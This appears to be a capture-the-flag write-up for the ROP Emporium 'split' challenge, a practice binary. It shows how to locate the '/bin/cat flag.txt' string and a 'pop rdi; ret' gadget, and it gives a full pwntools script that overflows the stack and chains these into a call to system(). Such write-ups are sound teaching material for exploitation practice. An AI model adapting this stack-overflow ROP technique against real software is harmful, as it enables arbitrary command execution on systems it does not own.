## Split
### Writeup
For this challenge, it is told to us that the libc function system() is present in the binary, as well as the string “bin/cat flag.txt”. The idea is to load the address of the string into the register for arg1 (%rdi - we will go more into this next challenge), then call system().

To do this, we need to first find the address of the string, which we can do by using rabin.

```
> rabin2 -z ./split

nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
6   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

This shows that the string address is at 0x00601060 (look under vaddr, not paddr since we reference vaddr during execution).

Then we just need a gadget to help put this address in arg 1 (%rdi).

```
> ROPgadget --binary=./split | grep ret | grep rdi

0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e

0x00000000004007c3 : pop rdi ; ret

0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
```
**pop rdi ; ret** helps us achieve that and thus, our full payload is: stack smash bytes + pop rdi + address of cat string + system() syscall.

### Exploit
```
#!/bin/env python3
from pwn import *; 
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")

context.log_level = "info"
elf = context.binary = ELF("./split")
p = elf.process()

bincat_str = 0x601060 # .string "/bin/cat flag.txt" ; len=18
# bincat_str = next(elf.search(b"/bin/cat flag.txt")) is another way to get the addr btw
system_syscall = 0x40074b # call sym.imp.system; nop; pop rbp; ret
pop_rdi = 0x4007c3 # pop rdi; ret
trash = 0x0 # without this, program just hangs
stack_smash = b"A" * 40

payload = flat(
        stack_smash,
        pop_rdi,
        bincat_str,
        system_syscall,
        trash
)

p.recvuntil(b"> ")
p.sendline(payload)
flag = [w for w in p.recvall().split() if w.startswith(b"ROPE{")][0].decode()
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")
```